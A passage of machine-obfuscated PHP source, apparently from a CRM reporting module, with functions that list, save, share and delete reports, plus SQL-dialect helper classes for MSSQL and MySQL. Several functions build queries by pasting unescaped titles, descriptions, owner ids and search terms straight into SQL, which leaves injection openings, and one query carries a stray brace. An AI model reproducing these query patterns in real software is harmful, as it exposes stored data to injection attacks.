{function ZZZZZZR1717($ZZZP1515, $ZZZZa0) {$ZZZZZZS1818 = " AND visible = 1 ";if($ZZZZa0) {$ZZZZZZS1818 = "";} $ZZn13 = $this->db->ZZZu20("SELECT COUNT(*) AS count FROM {$this->db->dbPrefix}advancedreports WHERE category_id = ". (int)$ZZZP1515 . " " . $ZZZZZZS1818);return $ZZn13[0]['count'];} function ZZZZZZT1919($limit) {$ZZZz25 = $this->db->run_query_allrecords("SELECT id, options FROM {$this->db->dbPrefix}advancedreports WHERE options LIKE '%limit%'");$ZZZZZZU2020 = count($ZZZz25);for($Zf5=0;$Zf5 < $ZZZZZZU2020;$Zf5++){$ZZZJ99 = json_decode($ZZZz25[$Zf5]['options'], true);$ZZZJ99['limit'] = $limit;$ZZZJ99 = json_encode($ZZZJ99);$this->db->ZZH77("UPDATE {$this->db->dbPrefix}advancedreports SET options = ? WHERE id = ? ", array($ZZZJ99, $ZZZz25[$Zf5]['id']));}} function ZZZZZZV2121(array $ZZZZZZW2222) {$ZZZZZQ1616 = $this->db->run_query_allrecords("SELECT id, columnstate FROM {$this->db->dbPrefix}advancedreports");$ZZZZZZX2323 = count($ZZZZZQ1616);for($Zf5=0;$Zf5<$ZZZZZZX2323;$Zf5++){$ZZZZZZY2424 = array();if($ZZZZZQ1616[$Zf5]['columnstate'] !== NULL){$ZZZZZZY2424 = json_decode($ZZZZZQ1616[$Zf5]['columnstate'], true);} $ZZZZZZY2424['sectionStates'] = $ZZZZZZW2222;$ZZZZZZY2424 = json_encode($ZZZZZZY2424);$this->db->ZZH77("UPDATE {$this->db->dbPrefix}advancedreports SET columnstate = ? WHERE id = ?", array($ZZZZZZY2424,$ZZZZZQ1616[$Zf5]['id']));}} function ZZZZR1717(ARUser $ZZZZW2222) {$ZZZZS1818 = new ZZZZT1919();$ZZZZZZZ2525 = $ZZZZS1818->getUserGroups($ZZZZW2222->ZZZZZZC22());if(empty($ZZZZZZZ2525)){$ZZZZZZZ2525 = array(-1);} $query = "SELECT r.*, a.can_edit as can_edit, a.can_delete as can_delete". " FROM {$this->db->dbPrefix}advancedreports r LEFT JOIN (SELECT r2.id as id, COUNT(*) as 'cnt', COALESCE(COALESCE(SUM(g.level),0) +COALESCE(SUM(u.level),0) +".ZZZZZZZa0::ZZZZZZZb1("r2.owner='{$ZZZZW2222->ZZZZZZC22()}' OR r2.sharedlevel=1", 1, 0).", 0) as can_edit, sum(". ZZZZZZZa0::ZZZZZZZb1('u.level=2', 1, 0)."+". ZZZZZZZa0::ZZZZZZZb1('g.level=2', 1, 0)."+". ZZZZZZZa0::ZZZZZZZb1("r2.owner='{$ZZZZW2222->ZZZZZZC22()}' OR r2.sharedlevel=1", 1, 0). ") as can_delete FROM {$this->db->dbPrefix}advancedreports r2 LEFT JOIN {$this->db->dbPrefix}advancedreports_sharedusers u on u.report_id = r2.id LEFT JOIN {$this->db->dbPrefix}advancedreports_sharedgroups g on g.report_id = r2.id WHERE (r2.owner = '{$ZZZZW2222->ZZZZZZC22()}}' OR u.user_id = '{$ZZZZW2222->ZZZZZZC22()}}' OR g.group_id IN (". implode(",",$this->db->ZZK1010($ZZZZZZZ2525)).")) OR r2.shared = 1 GROUP BY r2.id, r2.sharedlevel, r2.owner) a ON a.id = r.id WHERE a.cnt>0";if($ZZZZW2222->ZZZZU2020()){$query = "SELECT r.* FROM {$this->db->dbPrefix}advancedreports r";} $report = $this->db->run_query_allrecords($query);return $report;} function listReports($ZZZX2323,$ZZZY2424,$ZZZZ2525,$ZZZP1515=null,$ZZZZa0=false, $ZZZZZZZc2=false, $ZZZZZZZd3=false){$ZZS1818 = null;$ZZZZb1 = " AND ";$ZZZZc2 = " r.visible = 1 ";if($ZZZZa0) {$ZZZZb1 = "";$ZZZZc2 = "";} $ZZZZZZZe4 = "";if($ZZZP1515 != "#"){$ZZZZZZZe4 = " AND r.category_id = ". (int) $ZZZP1515;} $ZZZZZZZf5 = "";$ZZZZZZZg6 = "";$ZZZZH77 = " ORDER BY r.sequence ASC";$ZZZZZZZh7 = "";if($ZZZZZZZc2){$ZZZZZZZg6 = ", 0";if($ZZZZZZZc2){global $mod_strings;$ZZZZZZZi8 = "/(".implode("|", $ZZZZZZZc2).")/i";$ZZZZZZZj9 = preg_grep($ZZZZZZZi8, $mod_strings);foreach ($ZZZZZZZj9 as $Zu20 => $value) {if($Zu20 != $value){$ZZZZZZZg6.= " +(CASE WHEN r.title LIKE '".$Zu20."' THEN 1 ELSE 0 END)";$ZZZZZZZf5.= " OR r.title LIKE '".$Zu20."'";}}} $ZZZZZZZh7 = " AND (1=2";$ZZZZZZZk10 = " OR ";if($ZZZZZZZd3){$ZZZZZZZh7 = " AND (1=1";$ZZZZZZZk10 = " AND ";} $ZZZZH77 = " ORDER BY relevance DESC";foreach ($ZZZZZZZc2 as $ZZZZZZZl11) {$ZZZZZZZg6.= " +(CASE WHEN r.title LIKE '%".$ZZZZZZZl11."%' THEN 1 ELSE 0 END)";$ZZZZZZZg6.= " +(CASE WHEN r.description LIKE '%".$ZZZZZZZl11."%' THEN 1 ELSE 0 END)";$ZZZZZZZh7.= $ZZZZZZZk10."((r.title LIKE '%".$ZZZZZZZl11."%') OR (r.description LIKE '%".$ZZZZZZZl11."%'))";} $ZZZZZZZg6.= " as relevance";$ZZZZZZZh7.= ")";} if($ZZZX2323){$query = "SELECT r.*, 2 as can_edit, 1 as can_delete".$ZZZZZZZg6." FROM {$this->db->dbPrefix}advancedreports r WHERE 1=1".$ZZZZZZZe4.$ZZZZZZZh7.$ZZZZZZZf5.$ZZZZb1.$ZZZZc2.$ZZZZH77;}else{if(empty($ZZZZ2525) || (count($ZZZZ2525) == 1 && $ZZZZ2525[0]=="")){$ZZZZ2525 = array(-1);} $query = "SELECT r.* , a.can_edit as can_edit, a.can_delete as can_delete".$ZZZZZZZg6. " FROM {$this->db->dbPrefix}advancedreports r LEFT JOIN (SELECT r2.id as id, COUNT(*) as 'cnt', COALESCE(COALESCE(SUM(g.level),0) +COALESCE(SUM(u.level),0) +".ZZZZZZZa0::ZZZZZZZb1("r2.owner='{$ZZZY2424}' OR r2.sharedlevel=1", 1, 0).", 0) as can_edit, sum(". ZZZZZZZa0::ZZZZZZZb1('u.level=2', 1, 0)."+". ZZZZZZZa0::ZZZZZZZb1('g.level=2', 1, 0)."+". ZZZZZZZa0::ZZZZZZZb1("r2.owner='{$ZZZY2424}' OR r2.sharedlevel=1", 1, 0). ") as can_delete FROM {$this->db->dbPrefix}advancedreports r2 LEFT JOIN {$this->db->dbPrefix}advancedreports_sharedusers u on u.report_id = r2.id LEFT JOIN {$this->db->dbPrefix}advancedreports_sharedgroups g on g.report_id = r2.id WHERE (r2.owner = '$ZZZY2424' OR u.user_id = '$ZZZY2424' OR g.group_id IN (". implode(",",$this->db->ZZK1010($ZZZZ2525)).")) OR r2.shared = 1 GROUP BY r2.id, r2.sharedlevel, r2.owner) a ON a.id = r.id WHERE a.cnt>0". $ZZZZZZZe4. $ZZZZZZZh7. $ZZZZZZZf5. $ZZZZb1.$ZZZZc2. $ZZZZH77;} $ZZS1818 = $this->db->run_query_allrecords($query);return $ZZS1818;} function ZZZB11($ZZZC22, $ZZZD33, $ZZZE44, $ZZZF55) {if($ZZZD33 == "PUB"){$ZZZD33 = 1;if($ZZZE44=="EDIT"){$ZZZE44 = 1;}elseif($ZZZE44=="DELETE"){$ZZZE44 = 2;}else{$ZZZE44 = 0;}}else{$ZZZD33 = 0;$ZZZE44 = 0;} $ZZq16 = "UPDATE {$this->db->dbPrefix}advancedreports SET shared=?, sharedlevel=?, owner=? WHERE id = ?";$ZZZx23 = array($ZZZD33, $ZZZE44, $ZZZF55, $ZZZC22);$ZY2424 = $this->db->ZZH77($ZZq16,$ZZZx23);return $ZY2424;} function saveReport($id, $ZZZc2, $filters, $ZZZG66, $ZZZH77, $ZZZI88, $ZZZJ99, $ZZZK1010, $ZZZL1111,$ZZZD33,$ZZZE44,$ZZZF55,$ZZZM1212,$ZZZN1313 = null, $ZZZZZZY2424){if($ZZZD33 == "PUB"){$ZZZD33 = 1;if($ZZZE44=="EDIT"){$ZZZE44 = 1;}elseif($ZZZE44=="DELETE"){$ZZZE44 = 2;}else{$ZZZE44 = 0;}}else{$ZZZD33 = 0;$ZZZE44 = 0;} $ZZq16 = "UPDATE {$this->db->dbPrefix}advancedreports SET fields=".ZZZZZZZa0::ZZZZZZZm12($ZZZc2).", filters = ".ZZZZZZZa0::ZZZZZZZm12($filters).", grouping = ".ZZZZZZZa0::ZZZZZZZm12($ZZZG66).", aggregates = ".ZZZZZZZa0::ZZZZZZZm12($ZZZH77).", totalAggregates = ".ZZZZZZZa0::ZZZZZZZm12($ZZZI88).", options = ".ZZZZZZZa0::ZZZZZZZm12($ZZZJ99).", labels = ".ZZZZZZZa0::ZZZZZZZm12($ZZZK1010).", chart = ".ZZZZZZZa0::ZZZZZZZm12($ZZZL1111).", shared=?, sharedlevel=?, owner=?, calcFields= ".ZZZZZZZa0::ZZZZZZZm12($ZZZM1212).", columnstate = ".ZZZZZZZa0::ZZZZZZZm12($ZZZZZZY2424);$ZZZx23 = array($ZZZD33, $ZZZE44, $ZZZF55,);if($ZZZN1313!=null){$ZZq16.= ", combinedfields=".ZZZZZZZa0::ZZZZZZZm12($ZZZN1313);} $ZZq16.= " WHERE id = ?";$ZZZx23[] = $id;$ZY2424 = $this->db->ZZH77($ZZq16,$ZZZx23,true);} function ZZZO1414($module, $ZZZP1515, $ZZZQ1616, $ZZZc2, $filters, $ZZZG66, $ZZZH77, $ZZZI88, $ZZZJ99, $ZZZK1010, $title,$description,$ZZZL1111,$ZZZD33,$ZZZE44,$ZZZF55,$ZZZM1212,$isCombined = 0, $ZZZR1717 = null, $ZZZZZZY2424){if($ZZZD33 == "PUB"){$ZZZD33 = 1;if($ZZZE44=="EDIT"){$ZZZE44 = 1;}elseif($ZZZE44=="DELETE"){$ZZZE44 = 2;}else{$ZZZE44 = 0;}}else{$ZZZD33 = 0;$ZZZE44 = 0;} $ZZS1818 = $this->db->ZZH77("SELECT COALESCE(MAX(sequence) + 1, 0) AS sequence FROM {$this->db->dbPrefix}advancedreports WHERE category_id = ? ", array($ZZZP1515));$ZZZS1818 = $this->db->ZZI88($ZZS1818, 'sequence');$ZZq16 = "INSERT INTO {$this->db->dbPrefix}advancedreports (module, category_id, sequence, related_data, fields, filters, grouping, aggregates, totalAggregates, title, description, options, labels, chart, shared, sharedlevel, owner, iscombined, combinedfields, calcFields, columnstate) VALUES (?, ?, ?, ".ZZZZZZZa0::ZZZZZZZm12($ZZZQ1616).", ".ZZZZZZZa0::ZZZZZZZm12($ZZZc2).", ".ZZZZZZZa0::ZZZZZZZm12($filters).", ".ZZZZZZZa0::ZZZZZZZm12($ZZZG66).", ".ZZZZZZZa0::ZZZZZZZm12($ZZZH77).", ".ZZZZZZZa0::ZZZZZZZm12($ZZZI88).", ?, ?, ".ZZZZZZZa0::ZZZZZZZm12($ZZZJ99).", ".ZZZZZZZa0::ZZZZZZZm12($ZZZK1010).", ".ZZZZZZZa0::ZZZZZZZm12($ZZZL1111).", ?, ?, ?, ?, ".ZZZZZZZa0::ZZZZZZZm12($ZZZR1717).", ".ZZZZZZZa0::ZZZZZZZm12($ZZZM1212).", ".ZZZZZZZa0::ZZZZZZZm12($ZZZZZZY2424).")";$ZZZx23 = array($module, $ZZZP1515, $ZZZS1818, $title, $description, $ZZZD33, $ZZZE44, $ZZZF55, $isCombined,);$this->db->setDieOnError(true);$this->db->ZZH77($ZZq16, $ZZZx23);$ZZS1818 = $this->db->run_query_allrecords("SELECT ".ZZZZZZZa0::ZZZZZZZn13()." AS id");return $ZZS1818[0]['id'];} function ZZZZZZZo14($ZZZZZZZp15 = array(), $id = 0) {$id = (int)$id;if($id <= 0){return;} $ZZq16 = "";foreach ($ZZZZZZZp15 as $Zu20 => $value) {switch ($Zu20){case 'related_data': case 'options': $ZZq16 .= $Zu20." = ".ZZZZZZZa0::ZZZZZZZm12($value).",";break;default: $ZZq16 .= $Zu20." = '".$value."',";break;}} $ZZq16 = rtrim($ZZq16, ",");$ZZq16 = "UPDATE {$this->db->dbPrefix}advancedreports SET {$ZZq16} WHERE id = {$id}";return $this->db->ZZH77($ZZq16, array());} function ZZZZJ99($ZZZZK1010){$ZZq16 = "SELECT MAX(sequence) FROM {$this->db->dbPrefix}advancedreports WHERE category_id = {$ZZZZK1010['selectedCategory']}";$ZZZS1818 = $this->db->ZZZu20($ZZq16);$ZZZS1818 = $ZZZS1818[0][0];if(empty($ZZZS1818)){$ZZZS1818 = 1;}else{$ZZZS1818++;} $ZZZF55 = $ZZZZK1010['owner'];$ZZZZZZZq16 = "";if($ZZZZK1010['customOptions']['enableAudit'] == 'true')$ZZZZZZZq16.=',"enableAudit":true';if($ZZZZK1010['customOptions']['enableCustomTables'] == 'true')$ZZZZZZZq16.=',"enableCustomTables":true';if($ZZZZK1010['selectedReportType'] == 1)$ZZZZZZZq16.=',"isCombined":true';$ZZZJ99 = "{\"includeDetails\":true,\"isCrosstab\":false,\"aggregateColumn\":false{$ZZZZZZZq16}}";$ZZq16 = "INSERT INTO {$this->db->dbPrefix}advancedreports(category_id, sequence, module, related_data, fields, filters, grouping, aggregates, totalAggregates, title, description, options, labels, chart, owner, shared, sharedlevel, iscombined, combinedfields) VALUES ({$ZZZZK1010['selectedCategory']}, {$ZZZS1818}, '{$ZZZZK1010['mainModuleName']}', ".ZZZZZZZa0::ZZZZZZZm12($ZZZZK1010['selectedModules']).", ".ZZZZZZZa0::ZZZZZZZm12('[]').", ".ZZZZZZZa0::ZZZZZZZm12('[]').", ".ZZZZZZZa0::ZZZZZZZm12('[]').", ".ZZZZZZZa0::ZZZZZZZm12('[]').", ".ZZZZZZZa0::ZZZZZZZm12('{}').", '{$ZZZZK1010['reportTitle']}', '{$ZZZZK1010['reportDescription']}', ".ZZZZZZZa0::ZZZZZZZm12($ZZZJ99).", ".ZZZZZZZa0::ZZZZZZZm12('{}').", ".ZZZZZZZa0::ZZZZZZZm12('{"chartTitle":"","chartType":"pie","chartLabels":"","chartAxisX":"","chartAxisY":"","chartAxisY2":"","chartYAxisType":"","chartYAxis2Type":"","chartLegend":"","chartStacked":false}').", '{$ZZZF55}', 0, 0, {$ZZZZK1010['selectedReportType']}, ".ZZZZZZZa0::ZZZZZZZm12('{"sortAction":"group","dateGrouping":"day","sortDirection":"ASC","position":"column","fields":{}}').");";$this->db->ZZZv21($ZZq16);$ZY2424 = $this->db->ZZZv21("SELECT ".ZZZZZZZa0::ZZZZZZZn13()." AS id");$ZZr17 = $this->db->fetchRow($ZY2424);return $ZZr17['id'];} function ZZZZd3($id,$title,$description){$this->db->ZZH77("UPDATE {$this->db->dbPrefix}advancedreports SET title=?, description=? WHERE id = ?", array($title, $description, $id));} function deleteReport($id){$this->db->ZZH77("DELETE FROM {$this->db->dbPrefix}advancedreports WHERE id = ?", array($id));} function ZZZU2020($ZZZV2121="*", $ZZZW2222="", $limit=1){$query = "SELECT $ZZZV2121 FROM {$this->db->dbPrefix}advancedreports";if(!empty($ZZZW2222)){$query .= " WHERE $ZZZW2222";} if((int)$limit>0){$query.= " ORDER BY id ";$query.= ZZZZZZZa0::ZZZZZZZr17(0, $limit);} $query.=";";$report = $this->db->run_query_allrecords($query);foreach($report as &$ZZZZZZZs18) {$ZZZZZZZs18 = PlatformConnector::ZZZZZZs18($ZZZZZZZs18);} return $report;} function loadReport($id){$ZZS1818 = null;$ZZS1818 = $this->db->run_query_allrecords("SELECT * FROM {$this->db->dbPrefix}advancedreports WHERE id = ". (int)$id);if($ZZS1818){$ZZS1818 = $ZZS1818[0];$ZZS1818["related_data"] = json_decode($ZZS1818["related_data"],true);for($Zf5 = 0;$Zf5<count($ZZS1818['related_data']);$Zf5++){for($ZZZT1919 = 0;$ZZZT1919 <= 11;$ZZZT1919++) {if(!isset($ZZS1818["related_data"][$Zf5][$ZZZT1919])) {$ZZS1818["related_data"][$Zf5][$ZZZT1919] = false;}}}} $ZZS1818 = PlatformConnector::ZZZZZZs18($ZZS1818);return $ZZS1818;}}
;interface ZZZZZZZt19 {function ZZZZZZZu20();}
;class ZZZZZZZv21 {static protected $ZZZZZZZw22 = array("UNSIGNED" => "INT", "BLOB" => "varbinary(max)", "VARCHAR" => "NVARCHAR",);static function getType($type) {return self::$ZZZZZZZw22[$type];}} class ZZZZZZZx23 {static function ZZZZZZZn13() {return "SCOPE_IDENTITY()";} static function quote($ZZJ99) {return "[{$ZZJ99}]";} function ZZZZZZZy24($ZZZm12) {return "SET IDENTITY_INSERT {$ZZZm12} ON";} function ZZZZZZZz25($ZZZm12) {return "SET IDENTITY_INSERT {$ZZZm12} OFF";}} class ZZZZZZZA00 implements ZZZZZZZt19 {protected $r17;function __construct($value) {$this->r17 = $value;} function ZZZZZZZu20() {return $this->r17;}} class ZZZZZZZB11 implements ZZZZZZZt19 {protected $ZZZV2121;function __construct(array $ZZZV2121) {$this->ZZZV2121 = $ZZZV2121;} function ZZZZZZZu20() {return " " . implode(" + ", $this->ZZZV2121) . " ";}} class ZZZZZZZC22 implements ZZZZZZZt19 {protected $ZZZZZZZD33;protected $ZZZZZZZE44;protected $ZZZZZZZF55;function __construct($ZZZZZZZD33, $ZZZZZZZE44, $ZZZZZZZF55) {$this->ZZZZZZZD33 = $ZZZZZZZD33;$this->ZZZZZZZE44 = $ZZZZZZZE44;$this->ZZZZZZZF55 = $ZZZZZZZF55;} function ZZZZZZZG66($value) {$value = str_replace("'", "", $value);$ZZZZZZZH77 = ZZZZZZZv21::getType("VARCHAR");if(is_numeric($value)) {$ZZZZZZZH77 = ZZZZZZZv21::getType("UNSIGNED");} return $ZZZZZZZH77;} function ZZZZZZZu20() {$ZZZZZZZI88 = new ZZZZZZZJ99($this->ZZZZZZZE44, $this->ZZZZZZZG66($this->ZZZZZZZE44));$ZZZZZZZE44 = $ZZZZZZZI88->ZZZZZZZu20();$ZZZZZZZI88 = new ZZZZZZZJ99($this->ZZZZZZZF55, $this->ZZZZZZZG66($this->ZZZZZZZF55));$ZZZZZZZF55 = $ZZZZZZZI88->ZZZZZZZu20();return "IIF({$this->ZZZZZZZD33}, {$ZZZZZZZE44}, {$ZZZZZZZF55})";}} class ZZZZZZZK1010 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;protected $ZZZZZn13 = array();protected $ZZZZZZZM1212;function __construct($ZZZZZZZL1111, array $ZZZZZn13) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;$this->ZZZZZn13 = $ZZZZZn13;} function ZZZZZZZu20() {$ZZZZZZZN1313 = 0;$ZZZZZZZO1414 = array_keys($this->ZZZZZn13);$ZY2424 = "";$ZY2424 .= " CASE {$this->ZZZZZZZL1111} ";foreach ($ZZZZZZZO1414 as $ZZZZZZZP1515) {$ZY2424 .= " WHEN '{$ZZZZZZZP1515}' THEN {$ZZZZZZZN1313} ";$ZZZZZZZN1313++;} $ZY2424 .= " ELSE {$ZZZZZZZN1313} END ";return $ZY2424;}} class ZZZZZZZQ1616 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " LEN($this->ZZZZZZZL1111) ";}} class ZZZZZZZR1717 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;protected $ZO1414;protected $Zl11;function __construct($ZZZZZZZL1111, $ZO1414, $Zl11) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;$this->ZO1414 = $ZO1414;$this->Zl11 = $Zl11;} function ZZZZZZZu20() {return " SUBSTRING({$this->ZZZZZZZL1111}, {$this->ZO1414}, {$this->Zl11}) ";}} class ZZZZZZZS1818 implements ZZZZZZZt19 {protected $ZZZZZZZT1919;protected $ZZn13;function __construct($ZZZZZZZT1919, $ZZn13) {$this->ZZZZZZZT1919 = $ZZZZZZZT1919;$this->count = $ZZn13;} function ZZZZZZZu20() {return " OFFSET {$this->ZZZZZZZT1919} ROWS FETCH NEXT {$this->count} ROWS ONLY ";}} class ZZZZZZZU2020 {static function getInstance($ZZZZZZZV2121, $ZZZZZZZW2222) {switch($ZZZZZZZV2121) {case 'DATE': return new ZZZZZZZX2323($ZZZZZZZW2222);break;case 'WEEK': return new ZZZZZZZY2424($ZZZZZZZW2222);break;case 'YEAR': return new ZZZZZZZZ2525($ZZZZZZZW2222);break;case 'MONTH': return new ZZZZZZZZa0($ZZZZZZZW2222);break;case 'QUARTER': return new ZZZZZZZZb1($ZZZZZZZW2222);break;case 'HOUR': return new ZZZZZZZZc2($ZZZZZZZW2222);break;case 'MINUTE': return new ZZZZZZZZd3($ZZZZZZZW2222);break;case 'SECOND': return new ZZZZZZZZe4($ZZZZZZZW2222);break;case 'MICROSECOND': return new ZZZZZZZZf5($ZZZZZZZW2222);break;}}} class ZZZZZZZX2323 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " FORMAT({$this->ZZZZZZZL1111}, 'yyyy-MM-dd') ";}} class ZZZZZZZZg6 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;protected $value;protected $type;function __construct($ZZZZZZZL1111, $value, $type) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;$this->value = $value;$this->type = $type;} function ZZZZZZZu20() {return " DATEADD({$this->type}, {$this->value}, {$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZh7 implements ZZZZZZZt19 {function ZZZZZZZu20() {return "GETDATE()";}} class ZZZZZZZY2424 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " CAST(DATEPART(wk, {$this->ZZZZZZZL1111}) AS nvarchar) ";}} class ZZZZZZZZ2525 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " CAST(DATEPART(yy, {$this->ZZZZZZZL1111}) AS nvarchar) ";}} class ZZZZZZZZa0 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " CAST(DATEPART(mm, {$this->ZZZZZZZL1111}) AS nvarchar) ";}} class ZZZZZZZZb1 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " CAST(DATEPART(qq, {$this->ZZZZZZZL1111}) AS nvarchar) ";}} class ZZZZZZZZc2 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " DATEPART(hh, {$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZd3 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " DATEPART(mi, {$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZe4 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " DATEPART(ss, {$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZf5 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " DATEPART(mcs, {$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZi8 implements ZZZZZZZt19 {protected $Zu20;protected $value;function __construct($Zu20, $value = null) {$this->key = $Zu20;$this->value = $value;} function ZZZZZZZu20() {if($this->key == 'names') {return '';} if($this->key == 'default_week_format') {return '';}}} class ZZZZZZZZj9 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;protected $ZZZZZZZZk10;protected $ZZZZZZZZl11;function __construct($ZZZZZZZL1111, $ZZZZZZZZk10, $ZZZZZZZZl11) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;$this->ZZZZZZZZk10 = $ZZZZZZZZk10;$this->ZZZZZZZZl11 = $ZZZZZZZZl11;} function ZZZZZZZu20() {$ZZZZZZZT1919 = new ZZZZZZZJ99($this->ZZZZZZZL1111, "DATETIMEOFFSET");$ZZZZZZZL1111 = "SWITCHOFFSET({$ZZZZZZZT1919->ZZZZZZZu20()}, '{$this->ZZZZZZZZl11}')";$ZZZZZZZI88 = new ZZZZZZZJ99($ZZZZZZZL1111, "DATETIME");return $ZZZZZZZI88->ZZZZZZZu20();}} class ZZZZZZZJ99 implements ZZZZZZZt19 {protected $r17;protected $type;protected $ZZZZZZZZm12;function __construct($r17, $type, $ZZZZZZZZm12 = null) {$this->r17 = $r17;$this->type = $type;$this->ZZZZZZZZm12 = $ZZZZZZZZm12;} function ZZZZZZZu20() {$ZY2424 = "";$ZY2424 .= " CONVERT({$this->type}, {$this->r17}";if($this->ZZZZZZZZm12) {$ZY2424 .= ", {$this->ZZZZZZZZm12}";} $ZY2424 .= ") ";return $ZY2424;}} class ZZZZZZZZn13 implements ZZZZZZZt19 {function __construct() {} function ZZZZZZZu20() {return "CAST(GETDATE() AS DATE)";}} class ZZZZZZZZo14 implements ZZZZZZZt19 {protected $name;function __construct($name) {$this->name = $name;} function ZZZZZZZu20() {return "#{$this->name}";}} class ZZZZZZZZp15 implements ZZZZZZZt19 {protected $name;protected $query;function __construct($name, $query) {$this->name = $name;$this->query = $query;} function ZZZZZZZu20() {$ZZZZZZZZq16 = new ZZZZZZZZr17($this->name);$ZZZZZZZZs18 = $ZZZZZZZZq16->ZZZZZZZu20();$ZZZZZZZZt19 = " SELECT * INTO {$this->name} FROM ({$this->query}) AS combinedTemporaryTable";return implode(";\n\r ", array($ZZZZZZZZs18, $ZZZZZZZZt19));}} class ZZZZZZZZr17 implements ZZZZZZZt19 {protected $name;function __construct($name) {$this->name = $name;} function ZZZZZZZu20() {return "IF OBJECT_ID('tempdb..{$this->name}') IS NOT NULL DROP TABLE {$this->name}";}} class ZZZZZZZZu20 implements ZZZZZZZt19 {protected $ZZZZZZZZv21;function __construct($ZZZZZZZZv21) {$this->ZZZZZZZZv21 = $ZZZZZZZZv21;} function ZZZZZZZu20() {return "{$this->ZZZZZZZZv21}";}} class ZZZZZZZZw22 implements ZZZZZZZt19 {protected $ZZZZZZZZx23;protected $type;protected $ZZZZZZZZy24;protected $ZZZZZZZZz25;function __construct($ZZZZZZZZx23="+", $type="day", $ZZZZZZZZz25, $ZZZZZZZZy24) {$this->ZZZZZZZZx23 = $ZZZZZZZZx23;$this->type = $type;$this->ZZZZZZZZz25 = $ZZZZZZZZz25;$this->ZZZZZZZZy24 = $ZZZZZZZZy24;} function ZZZZZZZu20() {return "DATEADD({$this->type}, {$this->ZZZZZZZZx23}{$this->ZZZZZZZZz25}, $this->ZZZZZZZZy24)";}} class ZZZZZZZZA00 implements ZZZZZZZt19 {protected $ZZZZZZZZB11;function __construct($ZZZZZZZZB11) {$this->ZZZZZZZZB11 = $ZZZZZZZZB11;} function ZZZZZZZu20() {return " COLLATE {$this->ZZZZZZZZB11} ";}}
;class ZZZZZZZZC22 {static protected $ZZZZZZZw22 = array("UNSIGNED" => "UNSIGNED", "BLOB" => "BLOB", "VARCHAR" => "VARCHAR",);static function getType($type) {return self::$ZZZZZZZw22[$type];}} class ZZZZZZZZD33 {static function ZZZZZZZn13() {return "last_insert_id()";} static function quote($ZZJ99) {return "`{$ZZJ99}`";} function ZZZZZZZy24($ZZZm12) {return "";} function ZZZZZZZz25($ZZZm12) {return "";}} class ZZZZZZZZE44 implements ZZZZZZZt19 {protected $r17;function __construct($value) {$this->r17 = $value;} function ZZZZZZZu20() {return $this->r17;}} class ZZZZZZZZF55 implements ZZZZZZZt19 {protected $ZZZV2121;function __construct(array $ZZZV2121) {$this->ZZZV2121 = $ZZZV2121;} function ZZZZZZZu20() {return " CONCAT(".implode(",", $this->ZZZV2121).") ";}} class ZZZZZZZZG66 implements ZZZZZZZt19 {protected $ZZZZZZZD33;protected $ZZZZZZZE44;protected $ZZZZZZZF55;function __construct($ZZZZZZZD33, $ZZZZZZZE44, $ZZZZZZZF55) {$this->ZZZZZZZD33 = $ZZZZZZZD33;$this->ZZZZZZZE44 = $ZZZZZZZE44;$this->ZZZZZZZF55 = $ZZZZZZZF55;} function ZZZZZZZu20() {return "IF({$this->ZZZZZZZD33}, {$this->ZZZZZZZE44}, {$this->ZZZZZZZF55})";}} class ZZZZZZZZH77 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;protected $ZZZZZn13 = array();protected $ZZZZZZZM1212;function __construct($ZZZZZZZL1111, array $ZZZZZn13) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;$this->ZZZZZn13 = $ZZZZZn13;} function ZZZZZZZu20() {$ZZZZZZZO1414 = array_keys($this->ZZZZZn13);foreach ($ZZZZZZZO1414 as &$ZZZZZZZP1515) {$ZZZZZZZP1515 = "'{$ZZZZZZZP1515}'";} $ZZZZZZZO1414 = implode(",", $ZZZZZZZO1414);return " FIELD({$this->ZZZZZZZL1111}, {$ZZZZZZZO1414}) ";}} class ZZZZZZZZI88 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " 